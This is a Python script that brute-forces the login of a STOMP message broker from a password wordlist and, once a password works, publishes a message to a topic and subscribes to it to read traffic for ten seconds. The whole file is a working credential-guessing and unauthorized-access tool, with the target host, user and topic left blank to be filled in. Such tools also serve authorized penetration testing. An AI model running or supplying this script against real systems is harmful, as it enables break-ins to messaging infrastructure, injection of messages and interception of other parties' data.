import time
import sys
import stomp

class MsgListener(stomp.ConnectionListener):
    def on_error(self, message):
        print('[ERROR]', message.body)

    def on_message(self, frame):
        print('[MSG ]', frame.body)



AMQHOST    = ""
AMQPORT    = ""
AMQUSER    = ""

TOPICNAME  = ""

PASS_FILE  = "pass.txt"
DELAY      = 0.01

hosts = [(AMQHOST, AMQPORT)]

print(f"[*] Bruteforce STOMP login: {AMQUSER} @ {AMQHOST}:{AMQPORT}")
print(f"[*] Wordlist: {PASS_FILE}\n")

try:
    with open(PASS_FILE, encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
    print(f"[-] File {PASS_FILE} not found")
    sys.exit(1)

print(f"[+] Password count: {len(passwords)}\n")

for idx, password in enumerate(passwords, 1):
    print(f"[{idx:4d}/{len(passwords):4d}] Try → {password:<24}", end="  ", flush=True)

    try:
        conn = stomp.Connection(host_and_ports=hosts, timeout=4)
        conn.set_listener('listener', MsgListener())

        conn.connect(
            AMQUSER,
            password,
            wait=True,
            headers={'client-id': 'brute-test'},
            timeout=4
        )

        print(f"Password Valid: {password}")

        test_msg = f"SendMessageStomp"
        conn.send(body=test_msg, destination=TOPICNAME)
        print(f"→ Message Send: {test_msg}")

        conn.subscribe(destination=TOPICNAME, id=1, ack='auto')
        print("Subscribe. Listing 10 sec...")
        time.sleep(10)

        conn.disconnect()
        break

    except Exception as e:
        err = str(e).lower()
        if "refused" in err or "timeout" in err or "connect" in err:
            print("Connect error")
        elif "authentication" in err or "login" in err or "401" in err or "403" in err:
            print("Password error")
        else:
            print(f"Error: {e}")

    time.sleep(DELAY)

else:
    print("\n[-] Password not found in wordlists")

print("\nDisconnect.")
